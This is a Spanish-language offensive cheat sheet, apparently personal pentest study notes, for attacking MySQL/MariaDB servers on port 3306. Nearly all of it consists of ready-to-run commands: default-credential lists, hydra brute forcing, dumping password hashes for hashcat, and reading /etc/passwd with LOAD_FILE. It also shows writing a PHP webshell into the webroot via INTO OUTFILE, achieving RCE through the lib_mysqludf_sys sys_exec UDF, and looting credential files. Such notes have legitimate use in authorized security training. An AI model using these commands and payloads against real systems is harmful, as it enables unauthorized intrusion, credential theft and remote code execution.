---
tipo: meta
aliases:
  - MySQL - matriz
  - mysql cheatsheet
  - MariaDB - matriz
tags:
  - meta/referencia
  - dominio/red
---

# MySQL - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Puerto: 3306/tcp**. Ataque del **servicio** MySQL/MariaDB: conectarse, enumerar, leer y escribir archivos, llegar a RCE. La inyección SQL en una app web es otra cosa: [[MOC - SQL injection]]. Criterio de recon en [[MOC - Reconocimiento de red]].

`HOST`, `u`, `p` son marcadores. La sesión se abre con `mysql -h HOST -u u -p` y adentro se corre SQL.

## Conectar

| Caso | Comando |
|---|---|
| Con contraseña (pide) | `mysql -h HOST -u u -p` |
| Contraseña en línea | `mysql -h HOST -u u -p'p'` (sin espacio) |
| Sin contraseña | `mysql -h HOST -u root` |
| Base puntual | `mysql -h HOST -u u -p'p' -D basededatos` |

Credenciales por defecto que valen probar: `root:(vacía)`, `root:root`, `root:toor`, `admin:admin`.

## Reconocimiento

| Comando | Qué da |
|---|---|
| `nmap -sV --script "mysql-info,mysql-empty-password,mysql-users,mysql-databases,mysql-variables" -p3306 HOST` | Versión, cuentas sin contraseña, usuarios, bases y variables |
| `hydra -L users.txt -P pass.txt HOST mysql` | Fuerza bruta de credenciales |

## Enumerar (dentro de la sesión)

| Tarea | SQL |
|---|---|
| Versión / usuario | `SELECT version(), current_user(), system_user();` |
| Bases | `SHOW DATABASES;` |
| Tablas de una base | `USE base; SHOW TABLES;` |
| Privilegios propios | `SHOW GRANTS;` |
| Hashes de todas las cuentas | `SELECT user, authentication_string FROM mysql.user;` |
| Variables clave | `SELECT @@secure_file_priv, @@datadir, @@plugin_dir, @@version_compile_os;` |

`mysql.user` requiere leer la base `mysql` (admin). Los hashes que saca se crackean con hashcat (modo `300` para MySQL 4.1+).

## Leer y escribir archivos

Requiere el privilegio **`FILE`** y que **`secure_file_priv`** lo permita (vacío = cualquier ruta; una ruta = solo ahí; `NULL` = deshabilitado).

| Tarea | SQL |
|---|---|
| Leer un archivo | `SELECT LOAD_FILE('/etc/passwd');` |
| Escribir webshell | `SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php';` |
| Volcar binario | `... INTO DUMPFILE '/ruta/archivo';` |

Escribir una webshell al webroot es **RCE** — el caso de mayor impacto del servicio. `OUTFILE` agrega saltos de línea; para binarios usar `DUMPFILE`.

## RCE por UDF

Con `FILE` y un `plugin_dir` escribible: subir `lib_mysqludf_sys` con `DUMPFILE`, crear la función y ejecutar.

`CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';` → `SELECT sys_exec('id > /tmp/o');`

## Configuración (con acceso al host)

| Archivo | Qué tiene |
|---|---|
| `/etc/mysql/my.cnf` · `mariadb.conf.d/` | Config: `secure_file_priv`, `plugin_dir`, bind-address |
| `~/.my.cnf` | **Credenciales en claro** del usuario — loot directo |
| `/etc/mysql/debian.cnf` | En Debian, credenciales del usuario `debian-sys-maint` (casi root) |
| `<datadir>/mysql/` | Los archivos de la base — hashes incluidos |

### Configuraciones peligrosas

| Config | Por qué importa |
|---|---|
| `secure_file_priv=` (vacío) | `INTO OUTFILE` a cualquier ruta → webshell al webroot |
| Privilegio `FILE` en cuenta de app | Habilita lectura/escritura de archivos desde una cuenta no-admin |
| `skip-grant-tables` | Arranca sin autenticación: cualquiera entra como root |
| `bind-address = 0.0.0.0` | El 3306 escucha en toda interfaz, no solo local |

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `ERROR 1045 Access denied` | credencial mala | probar defaults, o forzar |
| `The MySQL server is running with the --secure-file-priv` | `OUTFILE` restringido | escribir solo en la ruta permitida (ver `@@secure_file_priv`) |
| `ERROR 1290` al `LOAD_FILE` | sin privilegio `FILE` o ruta fuera de `secure_file_priv` | `SHOW GRANTS`, ajustar ruta |
| `Host ... is not allowed to connect` | el server filtra por origen | pivotar, o usar una IP permitida |
